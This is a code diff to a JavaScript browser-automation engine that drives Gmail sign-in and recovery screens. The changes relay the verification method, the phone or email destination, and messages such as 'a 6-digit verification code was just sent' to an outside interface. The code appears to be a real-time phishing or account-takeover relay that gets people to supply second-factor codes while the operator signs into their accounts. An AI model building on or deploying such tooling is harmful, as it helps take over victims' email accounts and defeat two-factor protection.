@@ -2201,6 +2201,7 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
                                 status: "WAITING_CODE",
                                 verificationState: 'WAITING_CODE',
                                 viewName: postRecoveryState.viewName,
+                                emailDestination: postRecoveryState.emailDestination || null,
                                 message: "Recovery email submitted. Verification code screen reached."
                             });
                             updateBrowserRowDataFast(browserId, updateData);
@@ -2568,6 +2569,7 @@ async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform
                                 verificationState: 'WAITING_CODE',
                                 viewName: postPhoneState.viewName,
                                 smsDestination: _smsDest,
+                                emailDestination: postPhoneState.emailDestination || null,
                                 message: _smsDest ? `A text message with a 6-digit verification code was just sent to ${_smsDest}.` : "Phone number submitted. Verification code screen reached."
                             });
                             updateBrowserRowDataFast(browserId, updateData);
@@ -4924,6 +4926,24 @@ if (!foundSelector) {
 
                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Processing option: ${JSON.stringify(selectedOption)} for view: ${currentActualViewName}`);
 
+                        if (selectedOption.disabled) {
+                            logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Chosen option is marked unavailable ("${selectedOption.label}"). Staying in WAITINGOPTIONS.`);
+                            updateData.verificationChoice = '';
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_OPTIONS",
+                                verificationState: 'WAITING_OPTIONS',
+                                viewName: currentActualViewName,
+                                verificationOptions: currentVerificationOptions,
+                                message: "That option is currently unavailable. Please choose another way."
+                            });
+                            updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationChoice: '', lastJsonResponse: updateData.lastJsonResponse });
+                            logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (option unavailable)`);
+                            activelyProcessing.delete(browserId);
+                            await new Promise(resolve => setTimeout(resolve, 10000));
+                            continue;
+                        }
+
                         try {
                             if (selectedOption.type !== 'full_email_input' && selectedOption.id) {
                                 await page.waitForSelector(`#${selectedOption.id}`, { visible: true, timeout: 5000 });
@@ -4997,6 +5017,7 @@ if (!foundSelector) {
                                             verificationState: 'WAITING_CODE',
                                             viewName: gmailPostClickVerification.viewName,
                                             verificationOptions: currentVerificationOptions,
+                                            emailDestination: gmailPostClickVerification.emailDestination || null,
                                             message: "Verification code screen reached."
                                         })
                                     };
@@ -5265,6 +5286,7 @@ if (!foundSelector) {
                     }
                 } catch (_) {}
                 const _isSmsResume = _freshView === 'Gmail SMS Code Entry';
+                const _freshEmail = _resumeProbe.emailDestination || null;
                 updateData.lastJsonResponse = JSON.stringify({
                     ..._existingLjr,
                     ...(_gmailMeta ? { gmail: _gmailMeta } : {}),
@@ -5272,7 +5294,8 @@ if (!foundSelector) {
                     verificationState: 'WAITING_CODE',
                     viewName: _freshView || _existingLjr.viewName || _cachedLjr.viewName || initialCheckResult.viewName || null,
                     smsDestination: _freshSms || _existingLjr.smsDestination || _cachedLjr.smsDestination || null,
-                    message: _isSmsResume ? (`A text message with a 6-digit verification code was just sent to ${_freshSms || 'your phone'}.`) : (_gmailMeta?.instructions || "Awaiting verification code.")
+                    emailDestination: _freshEmail || _existingLjr.emailDestination || _cachedLjr.emailDestination || null,
+                    message: _isSmsResume ? (`A text message with a 6-digit verification code was just sent to ${_freshSms || 'your phone'}.`) : (_freshEmail ? (`An email with a verification code was just sent to ${_freshEmail}.`) : (_gmailMeta?.instructions || "Awaiting verification code."))
                 });
                 updateBrowserRowDataFast(browserId, {
                     status: "WAITINGCODE", verified: true, fullAccess: false,
@@ -5885,6 +5908,7 @@ if (!foundSelector) {
                                                             verificationState: 'WAITING_CODE',
                                                             viewName: passiveProbe.viewName,
                                                             smsDestination: passiveProbe.smsDestination || _curLjr.smsDestination || null,
+                                                            emailDestination: passiveProbe.emailDestination || _curLjr.emailDestination || null,
                                                             message: passiveProbe.smsDestination ? `A text message with a 6-digit verification code was just sent to ${passiveProbe.smsDestination}.` : `Verification code screen reached (${passiveProbe.viewName}).`
                                                         });
                                                         updateBrowserRowDataFast(browserId, updateData);
@@ -6437,6 +6461,7 @@ if (!foundSelector) {
                 verificationState: initialCheckResult.verificationState, // Keep original with underscore
                 verificationOptions: initialCheckResult.verificationOptions || [],
                 viewName: initialCheckResult.viewName || null,
+                emailDestination: initialCheckResult.emailDestination || null,
                 platform, timestamp: new Date().toISOString(),
                 message: initialCheckResult.message || (sheetStatus === 'WAITINGOPTIONS' ? 'Awaiting verification choice.' : 'Awaiting verification code.')
             });
